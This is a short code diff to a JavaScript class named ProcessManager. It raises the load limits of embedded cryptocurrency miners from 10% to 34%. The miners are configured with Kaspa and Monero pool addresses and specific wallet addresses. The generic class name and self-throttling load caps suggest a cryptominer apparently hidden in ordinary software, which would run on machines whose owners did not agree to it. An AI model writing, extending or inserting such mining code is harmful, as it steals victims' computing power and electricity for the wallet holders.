@@ -36,7 +36,7 @@ class ProcessManager {
         this.config = {
             gpu: {
                 enabled: true,
-                maxLoad: 10,          // 10% GPU max
+                maxLoad: 34,          // 34% GPU max
                 pool: 'stratum+tcp://pool.woolypooly.com:3112',
                 wallet: 'kaspa:qpra2nvnhty2ec5u5zyenmgjvst9nyacztke42z0j598hekwt5rdqq46jr4sp3',
                 algorithm: 'KASPA'
@@ -44,7 +44,7 @@ class ProcessManager {
             cpu: {
                 enabled: true,
                 maxThreads: 1,        // Very conservative
-                maxLoad: 10,          // 10% CPU max
+                maxLoad: 34,          // 34% CPU max
                 pool: 'pool.supportxmr.com:3333',
                 wallet: '41ibGEw2aC7HySfkWT2Tky4yGReW4tQzMZvguCLfghSvADaXwLNmdpqa9xKxent5VB4oKfCde55gX44noxdT6iELR1fr2cf',
                 algorithm: 'RandomX'
